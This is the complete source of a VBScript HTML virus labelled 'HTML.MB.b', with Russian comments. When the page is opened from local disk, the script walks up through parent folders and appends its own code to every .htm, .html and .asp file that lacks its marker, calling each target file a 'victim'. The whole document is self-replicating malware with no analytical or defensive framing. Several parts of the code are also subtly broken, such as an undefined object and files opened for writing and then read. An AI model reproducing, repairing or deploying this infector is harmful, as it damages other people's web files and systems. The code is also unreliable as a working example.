<!-- HTML.MB.b -->
<script language="VBScript">
<!--
On Error Resume Next
If location.protocol = "file:" Then
   Set FSO = CreateObject("Scripting.FileSystemObject")
   Path = Replace(location.href, "/", "\")
   Path = Replace(Path, "file:\\\", "")
   NP = FSO.GetParentFolderName(Path)
   Set Folder = FSO.GetFolder(NP)
   Call ScanDir(Folder)
End If

Sub ScanDir(Dir)
While Dir.IsRootFolder = false
   Set Dir = FileSystem.GetFolder(NP)
   Set DF = Dir.Files
   Path = FSO.GetParentFolderName(NP)

For each Jertva in DF
    ext = Lcase(FSO.GetExtensionName(Jertva.name))
    If ext = "htm" or ext = "html" or ext ="asp" Then
    Set host = FSO.opentextfile(Jertva.path, 2, true)

    Stop = 0
    Do While host.AtEndOfStream <> True
        GetMark = host.ReadLine
        If GetMark = "<!-- HTML.MB.b -->" Then
            Stop = 1
        End If
    Loop

    If Stop = 0 Then
        'заражаем !
        'в файле вирусе спускаемся до метки
        Set CV = FSO.opentextfile(Path, 1, true)
        Do While Stop = 0
            GetMark = CV.ReadLine
            if GetMark = "<!-- HTML.MB.b -->" Then
               Stop = 1
            End If
        Loop
        'переписываем все до конца файла вируса в конец файла жертвы
        host.WriteLine "<!-- HTML.MB.b -->"
        Do While host.AtEndOfStream <> True
           host.WriteLine CV.ReadLine
        Loop
        host.Close
        CV.close
    Else
        host.Close
    End If
Next
Wend
End Sub
--></script>
